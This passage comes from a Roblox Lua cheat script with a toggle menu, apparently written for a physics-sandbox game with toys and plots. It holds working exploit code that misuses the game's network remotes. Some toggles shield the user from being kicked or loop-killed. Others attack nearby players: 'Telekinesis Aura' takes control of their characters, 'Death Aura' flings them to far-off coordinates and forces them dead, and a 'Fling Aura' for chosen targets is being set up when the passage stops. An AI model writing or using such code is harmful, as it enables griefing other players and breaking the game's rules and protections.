                                return plotItems:FindFirstChild("Plot"..i)
                            end
                        end
                    end
                end
            end
        end
        return nil
    end

    local function SpawnToy(ToyName)
        local InPlot = plr:FindFirstChild("InPlot")
        local InOwnedPlot = plr:FindFirstChild("InOwnedPlot")
        local CanSpawnToy = plr:FindFirstChild("CanSpawnToy")
        local inv = workspace:FindFirstChild(plr.Name.."SpawnedInToys")

        if InPlot and InPlot.Value and InOwnedPlot and not InOwnedPlot.Value then 
            InPlot:GetPropertyChangedSignal("Value"):Wait()
        end 
        if CanSpawnToy and not CanSpawnToy.Value then 
            CanSpawnToy:GetPropertyChangedSignal("Value"):Wait()
        end

        local hrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return nil end

        local SpawnCF = (MyPCLD or hrp).CFrame * CFrame.new(0, 14, 20)
        local Container = (InOwnedPlot and InOwnedPlot.Value) and CheckForHome() or inv
        if not Container then return nil end

        local spawnedObject = nil
        local connection
        connection = Container.ChildAdded:Connect(function(child)
            if child.Name == ToyName then
                spawnedObject = child
            end
        end)

        task.spawn(function()
            pcall(function()
                local menuToys = RS:FindFirstChild("MenuToys")
                local spawnRemote = menuToys and menuToys:FindFirstChild("SpawnToyRemoteFunction")
                if spawnRemote then
                    spawnRemote:InvokeServer(ToyName, SpawnCF, Vector3.zero)
                end
            end)
        end)

        local start = tick()
        repeat task.wait() until spawnedObject or (tick() - start) > 2.5

        if connection then connection:Disconnect() end
        return spawnedObject
    end

    local function FindPCLD(hrp)
        if pcldConn then pcldConn:Disconnect() end
        MyPCLD = nil
        pcldConn = RunService.Heartbeat:Connect(function()
            if MyPCLD or not hrp or not hrp.Parent then 
                if pcldConn then pcldConn:Disconnect() pcldConn = nil end
                return
            end
            for _, v in pairs(workspace:GetChildren()) do 
                if v.Name == "PlayerCharacterLocationDetector" and v:IsA("BasePart") then
                    if GetMagnitude(v, hrp) <= 2 then 
                        MyPCLD = v
                        break
                    end
                end
            end
        end)
    end

do


local AutoDeleteLegsActive = false
local DeleteLegsConnection = nil

local function PerformLegDeletion(char)
    -- Wait a brief moment to ensure the character is fully loaded
    task.wait(0.5) 
    
    if not AutoDeleteLegsActive then return end
    
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChild("Humanoid")
    local torso = char:FindFirstChild("Torso")
    local ll = char:FindFirstChild("Left Leg")
    local rl = char:FindFirstChild("Right Leg")
    
    if hrp and hum and torso and ll and rl then
        local void = workspace.FallenPartsDestroyHeight
        local pos = torso.CFrame
        
        workspace.FallenPartsDestroyHeight = -100
        ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(hrp, 2)
        task.wait(0.5)
        
        if ll and rl then
            rl.CFrame = CFrame.new(0, -10000, 0)
            ll.CFrame = CFrame.new(0, -10000, 0)
        end
        
        task.wait(0.3)
        if torso then torso.CFrame = CFrame.new(0, -9970, 0) end
        
        task.wait(0.5)
        if torso then torso.CFrame = pos end
        
        task.wait(0.5)
        workspace.FallenPartsDestroyHeight = void
        
        -- Safe HipHeight adjustment loop
        task.spawn(function()
            while AutoDeleteLegsActive and char.Parent and hum.Health > 0 and not char:FindFirstChild("Left Leg") and not char:FindFirstChild("Right Leg") do
                pcall(function()
                    local controls = Player.PlayerGui:FindFirstChild("ControlsGui")
                    if controls and controls:FindFirstChild("PCFrame") and controls.PCFrame:FindFirstChild("Stand") then
                        if controls.PCFrame.Stand.Visible == false then
                            hum.HipHeight = 2
                        else
                            hum.HipHeight = 0
                        end
                    end
                end)
                task.wait()
            end
        end)
    end
end

    -- =========================================================================
    -- ANTI-KICK ITEM TOGGLE
    -- =========================================================================
    DefenseExtra:CreateToggle({
        Name = "Anti Kick [ITEM]",
        Flag = "AntiKickItemFlag",
        Default = false,
        Callback = function(Val)
            if SetToggleState then SetToggleState("AntiKickItemFlag", Val) end
            AntiKickItemActive = Val 
            
            if Val then
                task.spawn(function()
                    local Item, SoundPart
                    while AntiKickItemActive and task.wait() do 
                        local char = plr.Character
                        local hrp = char and char:FindFirstChild("HumanoidRootPart")
                        local hum = char and char:FindFirstChild("Humanoid")
                        local inPlot = plr:FindFirstChild("InPlot")
                        local inv = workspace:FindFirstChild(plr.Name.."SpawnedInToys")
                        local destroyToy = RS:FindFirstChild("MenuToys") and RS.MenuToys:FindFirstChild("DestroyToy")
                        
                        -- Safety Checks
                        if not hrp or not hum or hum.Health <= 0 or not inv then continue end  
                        if inPlot and inPlot.Value then continue end 
                        
                        -- Initiate PCLD Tracking if needed
                        if not MyPCLD and not pcldConn then
                            FindPCLD(hrp)
                        end

                        Item = inv:FindFirstChild("AntiKickItem") 
                        SoundPart = Item and Item:FindFirstChild("Hitbox")
                        
                        -- Spawning Logic
                        if not Item or not SoundPart then
                            for _,v in pairs(inv:GetChildren()) do 
                                if v.Name == "AntiKickItem" then 
                                    pcall(function() destroyToy:FireServer(v) end)
                                end
                            end
                            
                            Item = SpawnToy(SelectedToy)
                            if not Item then continue end 
                            
                            SoundPart = Item and FWD(Item, "Hitbox", 0.5)
                            if SoundPart then sno(SoundPart) end
                            
                            for _,v in pairs(Item:GetChildren()) do 
                                if v:IsA("BasePart") then 
                                    v.CanCollide = false 
                                    v.Transparency = 0.8
                                    v.Color = Color3.fromRGB(0, 255, 255) -- Makes the item Cyan
                                end
                            end
                            
                            Item.Name = "AntiKickItem"
                        end
                        
                        -- Ownership Maintenance
                        if SoundPart and not CheckNetworkOwnerOnPart(SoundPart) then 
                            sno(SoundPart)
                        end
                        
                        -- Server-Synced Movement Logic
                        local targetPart = MyPCLD or hrp:FindFirstChild("FirePlayerPart") or hrp
                        if SoundPart and targetPart then
                            SoundPart.CFrame = targetPart.CFrame
                            SoundPart.AssemblyLinearVelocity = Vector3.zero
                            SoundPart.AssemblyAngularVelocity = Vector3.zero
                        end
                    end
                end)
            else
                -- Cleanup when toggled off
                if pcldConn then pcldConn:Disconnect() pcldConn = nil end
                MyPCLD = nil
                
                task.spawn(function()
                    local inv = workspace:FindFirstChild(plr.Name.."SpawnedInToys")
                    local destroyToy = RS:FindFirstChild("MenuToys") and RS.MenuToys:FindFirstChild("DestroyToy")
                    if inv and destroyToy then
                        for _,v in pairs(inv:GetChildren()) do 
                            if v.Name == "AntiKickItem" then 
                                pcall(function() destroyToy:FireServer(v) end)
                            end
                        end
                    end
                end)
            end
        end
    })

    -- Watchdog to reset PCLD tracker when character dies/respawns
    plr.CharacterAdded:Connect(function(char)
        if AntiKickItemActive then
            MyPCLD = nil
            local hrp = char:WaitForChild("HumanoidRootPart", 5)
            if hrp then FindPCLD(hrp) end
        end
    end)
end

do
    DefenseExtra:CreateToggle({
    Name = "Anti Kick(Shuriken)",
    Flag = "ShurikenAntiKick",
    Default = false,
    Callback = function(Value)
        SetToggleState("ShurikenAntiKick", Value)
        _G.ShurikenAntiKick = Value
        
        local function ClearKunai()
            local inv = workspace:FindFirstChild(Player.Name .. "SpawnedInToys")
            local destroyrem = RS:FindFirstChild("MenuToys") and RS.MenuToys:FindFirstChild("DestroyToy")
            if inv and destroyrem then
                for _, v in pairs(inv:GetChildren()) do
                    if v.Name == "AntiKick" or v.Name == "NinjaShuriken" then
                        pcall(function() destroyrem:FireServer(v) end)
                    end
                end
            end
        end

        if Value then
            task.spawn(function()
                local setOwner = RS:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")
                local stickyEvent = RS:WaitForChild("PlayerEvents"):WaitForChild("StickyPartEvent")
                local spawnRemote = RS:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")
                local canSpawn = Player:WaitForChild("CanSpawnToy")

                local function getHRP()
                    if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
                        return Player.Character.HumanoidRootPart
                    else
                        return Player.CharacterAdded:Wait():WaitForChild("HumanoidRootPart")
                    end
                end

                local function CheckForHome()
                    if not workspace.PlotItems.PlayersInPlots:FindFirstChild(Player.Name) then return false end
                    for _, v in pairs(workspace.Plots:GetChildren()) do
                        local sign = v:FindFirstChild("PlotSign")
                        local owners = sign and sign:FindFirstChild("ThisPlotsOwners")
                        if owners then
                            for _, b in pairs(owners:GetChildren()) do
                                if b.Value == Player.Name then
                                    local folder = workspace.PlotItems:FindFirstChild(v.Name)
                                    if folder then return true, folder end
                                end
                            end
                        end
                    end
                    return false
                end

                local function StickKunai(kunai)
                    if not kunai or not kunai:FindFirstChild("StickyPart") then return end
                    local currentHRP = getHRP()
                    if not currentHRP then return end
                    
                    if kunai:FindFirstChild("SoundPart") then
                        if not kunai.SoundPart:FindFirstChild("PartOwner") or kunai.SoundPart.PartOwner.Value ~= Player.Name then 
                            setOwner:FireServer(kunai.SoundPart, kunai.SoundPart.CFrame)
                        end
                    end
                    
                    local firePart = currentHRP:FindFirstChild("FirePlayerPart") or currentHRP:WaitForChild("FirePlayerPart", 5)
                    if firePart then
                        stickyEvent:FireServer(kunai.StickyPart, firePart, CFrame.new(0,0,0) * CFrame.Angles(0,math.rad(90),math.rad(90)))
                    end
                    
                    for _, obj in pairs(kunai:GetChildren()) do
                        if obj.Name == "Pyramid" then
                            obj.CanTouch = false; obj.CanCollide = false; obj.CanQuery = false; obj.Transparency = 0
                            if not obj:FindFirstChild("Highlight") then
                                local high = Instance.new("Highlight", obj)
                                high.FillColor = Color3.fromRGB(0, 0, 0)
                            end
                        elseif obj.Name == "Main" then
                            obj.CanTouch = false; obj.CanCollide = false; obj.CanQuery = false; obj.Transparency = 0
                            if not obj:FindFirstChild("Highlight") then
                                local high = Instance.new("Highlight", obj)
                                high.FillColor = Color3.fromRGB(255, 255, 255)
                            end
                        elseif obj:IsA("BasePart") then
                            obj.CanTouch = false; obj.CanCollide = false; obj.CanQuery = false; obj.Transparency = 1
                        end
                    end
                end

                local function SpawnToy(name)
                    local t = tick()
                    while not canSpawn.Value do
                        if not _G.ShurikenAntiKick or tick() - t > 5 then return nil end
                        task.wait(0.1)
                    end
                    local currentHRP = getHRP()
                    if currentHRP then
                        task.spawn(function()
                            pcall(function()
                                spawnRemote:InvokeServer(name, currentHRP.CFrame * CFrame.new(0, 12, 20), Vector3.new(0,0,0))
                            end)
                        end)
                    end
                    local boolik, house = CheckForHome()
                    local inv = workspace:FindFirstChild(Player.Name.."SpawnedInToys")
                    if boolik and house then 
                        return house:WaitForChild(name, 2)
                    elseif not workspace.PlotItems.PlayersInPlots:FindFirstChild(Player.Name) and inv then 
                        return inv:WaitForChild(name, 2)
                    end
                    return nil
                end

                while _G.ShurikenAntiKick do 
                    task.wait(0.005)
                    if not Player.Character or not Player.Character:FindFirstChild("Humanoid") or Player.Character.Humanoid.Health <= 0 then 
                        continue 
                    end
                    
                    local inv = workspace:FindFirstChild(Player.Name.."SpawnedInToys")
                    local kunai = inv and inv:FindFirstChild("NinjaShuriken")
                    
                    if workspace.PlotItems.PlayersInPlots:FindFirstChild(Player.Name) then 
                        local boolik, house = CheckForHome()
                        if boolik and house and workspace.Plots:FindFirstChild(house.Name) then
                            local sign = workspace.Plots[house.Name]:FindFirstChild("PlotSign")
                            if sign and sign.ThisPlotsOwners.Value.TimeRemainingNum.Value > 89 then 
                                kunai = SpawnToy("NinjaShuriken")
                                if kunai == nil then continue end
                                kunai.Name = "AntiKick" 
                                StickKunai(kunai)
                            end
                        end
                    end
                    
                    if not kunai then
                        if workspace.PlotItems.PlayersInPlots:FindFirstChild(Player.Name) then continue end 
                        kunai = SpawnToy("NinjaShuriken")
                        if kunai == nil then continue end 
                        kunai.Name = "AntiKick"
                        if not kunai then continue end 
                    end
                    
                    repeat
                        if kunai and kunai:FindFirstChild("StickyPart") and kunai.StickyPart.CanTouch == true then
                            StickKunai(kunai)
                            kunai.Name = "AntiKick"
                        end
                        task.wait(0.3)
                    until not kunai or not _G.ShurikenAntiKick or not kunai:FindFirstChild("StickyPart") or kunai.StickyPart.CanTouch == false 
                        or not Player.Character or not Player.Character:FindFirstChild("HumanoidRootPart") 
                        or not kunai:FindFirstChild("StickyPart") 
                        or (Player.Character.HumanoidRootPart.Position - kunai.StickyPart.Position).Magnitude >= 20
                        
                    if not kunai or not kunai:FindFirstChild("StickyPart") or not Player.Character or not Player.Character:FindFirstChild("HumanoidRootPart") or (Player.Character.HumanoidRootPart.Position - kunai.StickyPart.Position).Magnitude >= 20 then 
                        ClearKunai()
                    end 
                    
                    pcall(function()
                        repeat task.wait(0.05) until not _G.ShurikenAntiKick or not Player.Character or not Player.Character:FindFirstChild("Humanoid") or not kunai or not kunai:FindFirstChild("StickyPart") or not kunai.StickyPart:FindFirstChild("StickyWeld") or not kunai.StickyPart.StickyWeld.Part1
                        if not kunai or not kunai:FindFirstChild("StickyPart") or (Player.Character and Player.Character:FindFirstChild("Humanoid") and Player.Character.Humanoid.Health <= 0) or not kunai["StickyPart"]:FindFirstChild("StickyWeld").Part1 then 
                            ClearKunai()
                        end
                    end)
                end
                ClearKunai()
            end)
        else
            _G.ShurikenAntiKick = false
            ClearKunai()
        end
    end
})

Player.CharacterAdded:Connect(function()
    if _G.ShurikenAntiKick then
        task.wait(1)
    end
end)

-- AUTO-RESPAWN LOGIC: Re-runs the script loop when you die and respawn
plr.CharacterAdded:Connect(function()
    if _G.ShurikenAntiKick then
        task.wait(1) -- Wait for character to load properly
        -- The loop in the toggle will naturally pick up the new HRP
    end
end)

    do
        local pencilAntiKickActive = false
        local pencilAntiKickTask = nil
        local pencilRespawnConnection = nil

        local function spawnPencil()
            local spawnFolder = workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
            if not spawnFolder then return end
            
            local pencil = spawnFolder:FindFirstChild("ToolPencil")
            if pencil then return pencil end
            
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                pcall(function()
                    game:GetService("ReplicatedStorage").MenuToys.SpawnToyRemoteFunction:InvokeServer(
                        "ToolPencil",
                        CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.Position) + Vector3.new(0, 0, 15),
                        Vector3.new(0, 0, 0)
                    )
                end)
            end
            return nil
        end

        local function fixPencil()
            pcall(function()
                local playerName = LocalPlayer.Name
                local spawnFolder = workspace:FindFirstChild(playerName .. "SpawnedInToys")
                
                if not spawnFolder then return end
                
                local pencil = spawnFolder:FindFirstChild("ToolPencil")
                
                if not pencil then
                    pencil = spawnPencil()
                    if not pencil then return end
                end
                
                local char = LocalPlayer.Character
                if not char then return end
                
                local torso = char:FindFirstChild("Torso")
                local root = char:FindFirstChild("HumanoidRootPart")
                if not (torso and root) then return end
                
                local stickyPart = pencil:FindFirstChild("StickyPart")
                local soundPart = pencil:FindFirstChild("SoundPart")
                
                if stickyPart and stickyPart:FindFirstChild("StickyWeld") then
                    local weld = stickyPart.StickyWeld
                    
                    if weld.Part1 ~= torso then
                        local a = soundPart and soundPart.CFrame.Position or Vector3.zero
                        local b = root.CFrame.Position
                        local dist = (a - b).Magnitude
                        
                        if dist > 20 then
                            pcall(function()
                                game:GetService("ReplicatedStorage").MenuToys.DestroyToy:FireServer(pencil)
                            end)
                        else
                            pcall(function()
                                game:GetService("ReplicatedStorage").PlayerEvents.StickyPartEvent:FireServer(
                                    stickyPart,
                                    torso,
                                    CFrame.new(0, -1, 0) * CFrame.Angles(0, math.pi, 0)
                                )
                            end)
                            
                            for _, prt in pairs(pencil:GetChildren()) do
                                if prt:IsA("BasePart") then
                                    prt.CanQuery = false
                                    prt.CanCollide = false
                                    prt.CanTouch = false
                                end
                            end
                        end
                    end
                end
            end)
        end

        DefenseExtra:CreateToggle({
            Name = "Anti Kick (Pencil)",
            Default = false,
            Callback = function(Value)
                pencilAntiKickActive = Value
                
                if Value then
                    if pencilRespawnConnection then pencilRespawnConnection:Disconnect() end
                    pencilRespawnConnection = LocalPlayer.CharacterAdded:Connect(function()
                        task.wait(1)
                        if pencilAntiKickActive then
                            fixPencil()
                        end
                    end)
                    
                    pencilAntiKickTask = task.spawn(function()
                        while pencilAntiKickActive do
                            fixPencil()
                            task.wait(0.5)
                        end
                    end)
                else
                    pencilAntiKickActive = false
                    if pencilAntiKickTask then
                        task.cancel(pencilAntiKickTask)
                        pencilAntiKickTask = nil
                    end
                    if pencilRespawnConnection then
                        pencilRespawnConnection:Disconnect()
                        pencilRespawnConnection = nil
                    end
                    
                    local spawnFolder = workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
                    if spawnFolder then
                        local pencil = spawnFolder:FindFirstChild("ToolPencil")
                        if pencil then
                            pcall(function()
                                game:GetService("ReplicatedStorage").MenuToys.DestroyToy:FireServer(pencil)
                            end)
                        end
                    end
                end
            end
        })
    end
end

do

    -- Anti Blobman Kill
    do
        local ocnKakuConn = nil
        local ocnKakuAng = 0
        local savedPos = nil

        DefenseExtra:CreateToggle({
            Name = "Anti Blobman Kill",
            Default = false,
            Callback = function(Value)
                if Value then
                    local c = LocalPlayer.Character
                    local root = c and c:FindFirstChild("HumanoidRootPart")
                    if root then
                        savedPos = root.CFrame
                    end
                    ocnKakuConn = game:GetService("RunService").RenderStepped:Connect(function(dt)
                        pcall(function()
                            local c = LocalPlayer.Character
                            local root = c and c:FindFirstChild("HumanoidRootPart")
                            if root then
                                ocnKakuAng = ocnKakuAng + dt * 9999
                                local rad = math.rad(ocnKakuAng)
                                root.CFrame = CFrame.new(math.cos(rad) * 50000, -100000, math.sin(rad) * 50000)
                            end
                        end)
                    end)
                else
                    if ocnKakuConn then
                        ocnKakuConn:Disconnect()
                        ocnKakuConn = nil
                    end
                    ocnKakuAng = 0
                    local c = LocalPlayer.Character
                    local root = c and c:FindFirstChild("HumanoidRootPart")
                    if root and savedPos then
                        root.CFrame = savedPos
                        root.AssemblyLinearVelocity = Vector3.zero
                        root.AssemblyAngularVelocity = Vector3.zero
                        savedPos = nil
                    end
                end
            end
        })
    end

    -- Pos Lock
    do
        local ocnGroovConn = nil
        local ocnGroovPos = nil

        DefenseExtra:CreateToggle({
            Name = "Pos Lock",
            Default = false,
            Callback = function(Value)
                if Value then
                    pcall(function()
                        local c = LocalPlayer.Character
                        local root = c and c:FindFirstChild("HumanoidRootPart")
                        if root then
                            ocnGroovPos = root.CFrame
                        end
                        ocnGroovConn = game:GetService("RunService").RenderStepped:Connect(function()
                            local c2 = LocalPlayer.Character
                            local root2 = c2 and c2:FindFirstChild("HumanoidRootPart")
                            if root2 and ocnGroovPos then
                                local assembly = root2.AssemblyRootPart or root2
                                assembly.AssemblyLinearVelocity = Vector3.zero
                                assembly.AssemblyAngularVelocity = Vector3.zero
                                local offset = assembly.CFrame:ToObjectSpace(root2.CFrame)
                                assembly.CFrame = ocnGroovPos * offset:Inverse()
                            end
                        end)
                    end)
                else
                    if ocnGroovConn then
                        ocnGroovConn:Disconnect()
                        ocnGroovConn = nil
                    end
                    pcall(function()
                        local c2 = LocalPlayer.Character
                        local root2 = c2 and c2:FindFirstChild("HumanoidRootPart")
                        if root2 then
                            local assembly = root2.AssemblyRootPart or root2
                            assembly.AssemblyLinearVelocity = Vector3.zero
                            assembly.AssemblyAngularVelocity = Vector3.zero
                            if ocnGroovPos then
                                root2.CFrame = ocnGroovPos
                                ocnGroovPos = nil
                            end
                        end
                    end)
                end
            end
        })
    end

    -- Anti Loop Kill
    do
        local ocnStasisConn = nil
        local savedPos = nil

        DefenseExtra:CreateToggle({
            Name = "Anti Loop Kill",
            Default = false,
            Callback = function(Value)
                if Value then
                    local c = LocalPlayer.Character
                    local root = c and c:FindFirstChild("HumanoidRootPart")
                    if root then
                        savedPos = root.CFrame
                    end
                    ocnStasisConn = game:GetService("RunService").RenderStepped:Connect(function()
                        pcall(function()
                            local c = LocalPlayer.Character
                            local root = c and c:FindFirstChild("HumanoidRootPart")
                            if root then
                                root.CFrame = CFrame.new(280, -4, 465)
                            end
                        end)
                    end)
                else
                    if ocnStasisConn then
                        ocnStasisConn:Disconnect()
                        ocnStasisConn = nil
                    end
                    local c = LocalPlayer.Character
                    local root = c and c:FindFirstChild("HumanoidRootPart")
                    if root and savedPos then
                        root.CFrame = savedPos
                        root.AssemblyLinearVelocity = Vector3.zero
                        root.AssemblyAngularVelocity = Vector3.zero
                        savedPos = nil
                    end
                end
            end
        })
    end

    -- Loop TP (Op)
    do
        local ocnTornadoConn = nil
        local ocnTornadoAng = 0
        local savedPos = nil

        DefenseExtra:CreateToggle({
            Name = "Loop TP (Op)",
            Default = false,
            Callback = function(Value)
                if Value then
                    local c = LocalPlayer.Character
                    local root = c and c:FindFirstChild("HumanoidRootPart")
                    if root then
                        savedPos = root.CFrame
                    end
                    ocnTornadoConn = game:GetService("RunService").RenderStepped:Connect(function(dt)
                        pcall(function()
                            local c = LocalPlayer.Character
                            local root = c and c:FindFirstChild("HumanoidRootPart")
                            if root then
                                ocnTornadoAng = ocnTornadoAng + dt * 50000
                                local rad = math.rad(ocnTornadoAng)
                                root.CFrame = CFrame.new(math.cos(rad) * 10000, 0, math.sin(rad) * 10000)
                            end
                        end)
                    end)
                else
                    if ocnTornadoConn then
                        ocnTornadoConn:Disconnect()
                        ocnTornadoConn = nil
                    end
                    ocnTornadoAng = 0
                    local c = LocalPlayer.Character
                    local root = c and c:FindFirstChild("HumanoidRootPart")
                    if root and savedPos then
                        root.CFrame = savedPos
                        root.AssemblyLinearVelocity = Vector3.zero
                        root.AssemblyAngularVelocity = Vector3.zero
                        savedPos = nil
                    end
                end
            end
        })
    end

    -- Loop TP
    do
        local ocnManiacConn = nil
        local savedPos = nil

        DefenseExtra:CreateToggle({
            Name = "Loop TP",
            Default = false,
            Callback = function(Value)
                if Value then
                    local c = LocalPlayer.Character
                    local root = c and c:FindFirstChild("HumanoidRootPart")
                    if root then
                        savedPos = root.CFrame
                    end
                    ocnManiacConn = game:GetService("RunService").RenderStepped:Connect(function()
                        pcall(function()
                            local c = LocalPlayer.Character
                            local root = c and c:FindFirstChild("HumanoidRootPart")
                            if root then
                                local ms = 2000
                                root.CFrame = CFrame.new(
                                    math.random(-ms, ms),
                                    math.random(-50, 500),
                                    math.random(-ms, ms)
                                )
                            end
                        end)
                    end)
                else
                    if ocnManiacConn then
                        ocnManiacConn:Disconnect()
                        ocnManiacConn = nil
                    end
                    local c = LocalPlayer.Character
                    local root = c and c:FindFirstChild("HumanoidRootPart")
                    if root and savedPos then
                        root.CFrame = savedPos
                        root.AssemblyLinearVelocity = Vector3.zero
                        root.AssemblyAngularVelocity = Vector3.zero
                        savedPos = nil
                    end
                end
            end
        })
    end
end

local PS = game:GetService("Players")
local Player = PS.LocalPlayer

-- Variables to store state
local selectedKickPlayer = nil
local kickLoopEnabled = false
local kickLoopConnection = nil
local savedKickPos = nil
local currentKickTargetChar = nil

-- // Helper Functions \\ --

-- Formats the list as "Display Name (@Username)"
local function getPlayerList()
    local list = {}
    for _, plr in ipairs(PS:GetPlayers()) do
        if plr ~= Player then
            table.insert(list, plr.DisplayName .. " (@" .. plr.Name .. ")")
        end
    end
    return list
end

-- Extracts the username from the "Display Name (@Username)" string
local function getPlayerFromSelection(selection)
    if not selection or selection == "" then return nil end
    local username = selection:match("@(.-)%)")
    if username then
        return PS:FindFirstChild(username)
    end
    return nil
end

-- // UI Setup \\ --

-- Assuming 'Tabs' is defined in your main script setup
local TargetGroup = Tabs.Target:CreateBlock({Name = "Target Interaction", Side = "Left"})
local ChooseGroup = Tabs.Target:CreateBlock({Name = "Non-Blobman Methods", Side = "Right"})
local BlobGroup = Tabs.Target:CreateBlock({Name = "Blobman Kick", Side = "Right"})
local TelekinesisGroup = Tabs.Grab:CreateBlock({Name = "Telekinesis", Side = "Right"})


local vu390 = {
    localPlayer = game:GetService("Players").LocalPlayer,
    Players = game:GetService("Players"),
    auraRadius = 25,
    SetNetworkOwner = game:GetService("ReplicatedStorage"):WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")
}

local vu12 = { CurrentCamera = workspace.CurrentCamera }

vu390.localPlayer.CharacterAdded:Connect(function(p403)
    vu390.playerCharacter = p403
end)

local function startHellSendAura()
    vu390.gravityCoroutine = coroutine.create(function()
        while true do
            local v421, v422 = pcall(function()
                local v404 = vu390.localPlayer.Character
                if v404 and v404:FindFirstChild("HumanoidRootPart") then
                    local v405 = v404.HumanoidRootPart
                    local v406 = vu12.CurrentCamera
                    for _, v410 in pairs(vu390.Players:GetPlayers()) do
                        if v410 ~= vu390.localPlayer and v410.Character then
                            local v411 = v410.Character
                            local v412 = v411:FindFirstChild("Torso") or v411:FindFirstChild("UpperTorso")
                            if v412 and (v412.Position - v405.Position).Magnitude <= vu390.auraRadius then
                                vu390.SetNetworkOwner:FireServer(v412, v405.CFrame)
                                for _, v416 in ipairs(v411:GetDescendants()) do
                                    if v416:IsA("BasePart") then
                                        v416.CanCollide = false
                                    end
                                end
                                local v417 = v412:FindFirstChild("HellAuraPos") or Instance.new("BodyPosition")
                                v417.Name = "HellAuraPos"
                                v417.MaxForce = Vector3.new(100000, 100000, 100000)
                                v417.D = 500
                                v417.P = 50000
                                v417.Parent = v412
                                local v418 = v412:FindFirstChild("HellAuraGyro") or Instance.new("BodyGyro")
                                v418.Name = "HellAuraGyro"
                                v418.MaxTorque = Vector3.new(100000, 100000, 100000)
                                v418.D = 500
                                v418.P = 50000
                                v418.Parent = v412
                                local v419 = v406.CFrame.LookVector
                                local v420 = Vector3.new(0, 5, 0)
                                v417.Position = v405.Position + v419 * 15 + v420
                                v418.CFrame = CFrame.new(v412.Position, v405.Position)
                            end
                        end
                    end
                end
            end)
            if not v421 then
                warn("Error in Hell Send Aura: " .. tostring(v422))
            end
            task.wait(0.05)
        end
    end)
    coroutine.resume(vu390.gravityCoroutine)
end

local function stopHellSendAura()
    if vu390.gravityCoroutine then
        coroutine.close(vu390.gravityCoroutine)
        vu390.gravityCoroutine = nil
    end
end

TelekinesisGroup:CreateToggle({
    Name = "Telekinesis Aura",
        Flag = "Telekinesis Aura",
    Default = false,
    Callback = function(Value)
        SetToggleState("Telekinesis Aura", Value)
        if Value then
            startHellSendAura()
        else
            stopHellSendAura()
        end
    end
})

local deathConnection = nil
local vu29 = { Death_Aura = false }
local vu6 = {
    SetNetworkOwner = game:GetService("ReplicatedStorage"):WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner"),
    DestroyGrabLine = game:GetService("ReplicatedStorage"):WaitForChild("GrabEvents"):WaitForChild("DestroyGrabLine")
}

local function death(p424)
    if deathConnection then
        deathConnection:Disconnect()
        deathConnection = nil
    end
    if p424 then
        vu29.Death_Aura = true
        deathConnection = game:GetService("RunService").Heartbeat:Connect(function()
            for _, v429 in ipairs(game:GetService("Players"):GetPlayers()) do
                if v429 ~= LocalPlayer and v429.Character then
                    local vu430 = v429.Character:FindFirstChild("HumanoidRootPart")
                    local vu431 = v429.Character:FindFirstChild("Head")
                    local vu432 = v429.Character:FindFirstChildOfClass("Humanoid")
                    if vu430 and vu431 and vu432 and vu432.Health > 0 and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        if (vu430.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 25 then
                            pcall(function()
                                vu6.SetNetworkOwner:FireServer(vu430, vu430.CFrame)
                                task.wait(0.1)
                                vu6.DestroyGrabLine:FireServer(vu430)
                                if vu431:FindFirstChild("PartOwner") and vu431.PartOwner.Value == LocalPlayer.Name then
                                    for _, v436 in pairs(vu432.Parent:GetChildren()) do
                                        if v436:IsA("BasePart") then
                                            v436.CFrame = CFrame.new(-1000000000, 1000000000, -1000000000)
                                        end
                                    end
                                    task.wait()
                                    for _, v440 in pairs(vu432.Parent:GetChildren()) do
                                        if v440:IsA("BasePart") then
                                            v440.CFrame = CFrame.new(-1000000000, 1000000000, -1000000000)
                                        end
                                    end
                                    local vu441 = Instance.new("BodyVelocity")
                                    vu441.Velocity = Vector3.new(0, -9999999, 0)
                                    vu441.MaxForce = Vector3.new(9000000000, 9000000000, 9000000000)
                                    vu441.P = 100000075
                                    vu441.Parent = vu430
                                    vu432.Sit = false
                                    vu432.Jump = true
                                    vu432.BreakJointsOnDeath = false
                                    vu432:ChangeState(Enum.HumanoidStateType.Dead)
                                    task.delay(2, function()
                                        if vu441 and vu441.Parent then
                                            vu441:Destroy()
                                        end
                                    end)
                                end
                            end)
                        end
                    end
                end
            end
        end)
    else
        vu29.Death_Aura = false
    end
end

TelekinesisGroup:CreateToggle({
    Name = "Death Aura",
        Flag = "Death Aura",
    Default = false,
    Callback = death
})
-- [Kick Aura OP PREMIUM removed]
do
    -- // Services & Variables \\ --
    local playersService = game:GetService("Players")
    local workspaceService = game:GetService("Workspace")
    local debrisService = game:GetService("Debris")
    local localPlayer = playersService.LocalPlayer

    -- Remote Events required for network ownership
    local setNetworkOwnerEvent = game:GetService("ReplicatedStorage"):WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")

    -- Global Variables used by the Fling Aura UI
    _G.FlingAura = false
    _G.FlingStrength = 400
    _G.FlingTarget = 1 -- 1 = Players, 2 = Objects, 3 = Players and Objects

    -- // Helper Functions \\ --
    
    -- Calculates the CFrame needed to point the fling velocity at the target
    local function lookAt(startPosition, targetPosition)
        local directionVector = (targetPosition - startPosition).Unit
        local rightVector = directionVector:Cross((Vector3.new(0, 1, 0)))
        local upVector = rightVector:Cross(directionVector)
        return CFrame.fromMatrix(startPosition, rightVector, upVector)
    end

    local function GetPlayerCharacter()
        if localPlayer.Character and (localPlayer.Character:FindFirstChild("HumanoidRootPart") and localPlayer.Character:FindFirstChildOfClass("Humanoid")) then
            return localPlayer.Character
        end
    end

    local function GetPlayerRoot()
        local playerHumanoidRootPart = GetPlayerCharacter()
        if playerHumanoidRootPart then
            return playerHumanoidRootPart.HumanoidRootPart
        end
    end

    -- Network Ownership Checks
    local function CheckNetworkOwnerShipOnPart(potentialPart, condition)
